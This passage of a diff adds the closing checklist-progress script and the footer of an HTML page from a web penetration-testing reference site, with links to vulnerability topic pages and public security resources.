+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(wrap => {
+    const all = wrap.querySelectorAll('input[type=checkbox]');
+    const done = wrap.querySelectorAll('input[type=checkbox]:checked');
+    const mini = wrap.querySelector('.progress-mini');
+    const bar = wrap.querySelector('.progress-bar');
+    if (mini) mini.textContent = done.length + '/' + all.length;
+    if (bar) bar.style.width = (all.length ? (done.length/all.length*100) : 0) + '%';
+  });
+}
+updateProgress();
+</script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
